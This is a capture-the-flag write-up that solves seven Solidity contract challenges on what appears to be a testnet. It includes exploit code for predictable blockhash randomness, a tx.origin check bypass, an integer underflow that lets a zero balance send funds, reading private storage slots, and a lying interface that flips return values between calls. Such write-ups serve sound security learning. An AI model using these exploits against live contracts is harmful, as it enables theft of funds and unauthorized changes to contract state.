## CTF

#### 1) Flip 🪙

The objective is to predict 10 times the correct flip.
This is possible due to the accessibility of the "*random*" **FACTOR** of the contract. We can reproduce the calcul and predict **each time** the correct flip.
```sol
uint256 FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;
uint256 lastHash;

function flip() public payable returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool win = toHack.flip(side);
        return win;
    }
```

#### 2) AddPoint 🥇

The only one thing to do to get this point is to call the function from another address. The idea is to call a smart contract which call the function, then `tx.origin != msg.sender`.

#### 3) Transfer 💸

The main difficulty of this one is to make a transaction while we have no found. But good for us, this contract is in `solidity ^0.7.0` so the overflows / underflows errors are not natively reverted.

That's why in this require :
```sol
require(balances[msg.sender] - _value >= 0);
```
With a balance of 0 and a _value of 1 we can break the underflow and we obtens a realy **HIGH** value. Then we can bypass the require and send a money we don't have.

#### 4) Send Password 🙊

To achieve this objective we have to read a private value in the storage. To process we calculate the storage slot of the variable we are looking for :
```sol
uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917; // 0
address public owner; // 1
uint256 lastHash; // 2
bytes32 private password; // 3
bytes32[15] private data; // 4 - 19
```
A slot can store up to 32 bytes (256 bits) so if a variable need more space than the actual slot, it use another one. In our case we can calculate easily the slot of the password : **3**

We can now access the storage and get the password :
```sol
uint startSlot = 3;
bytes32 password = vm.load(address(toHack),bytes32(startSlot));
```

#### 5) Send Key 🔑

The idea is the same as the password objective but to calculate the slot we have to think about the index of the data in the array :
```sol
startSlot = 16; // 4 + 12
bytes32 key = vm.load(address(toHack),bytes32(startSlot));
```

#### 6) Contribute 🤚

This one is a two step objective :
1. Add contribution
1. Send SepETH to the contract and contact the receive callback

```sol
contractToHack.contribute{value: 0.00001 ether}();
address(contractToHack).call{value: 0.00001 ether}("");
```

#### 7) GoTo 🛗

For this one we just have to implement the interface **Building** in our contract and describe its function as we need it to be :

```sol
function goTo(uint256 _floor) public whenUnlocked {
    Building building = Building(msg.sender); // <-- OUR ENTRY

    if (!building.isLastFloor(_floor)) {
        userFloor[tx.origin] = _floor;
        top[tx.origin] = building.isLastFloor(_floor);
        if (top[tx.origin]) {
            if (!alreadyCalled[tx.origin]["goTo"]) {
                marks[tx.origin] += 4;
                alreadyCalled[tx.origin]["goTo"] = true;
            }
        }
    }
}
```

```sol
bool public switchFlipped =  false;
    
function isLastFloor(uint) external returns (bool) {
    // first call
    if (! switchFlipped) {
        switchFlipped = true;
        return false;
    // second call
    } else {
        switchFlipped = false;
        return true;
    }
}
```
With our code we can now bypasse the security and switch the state to achieve our objective.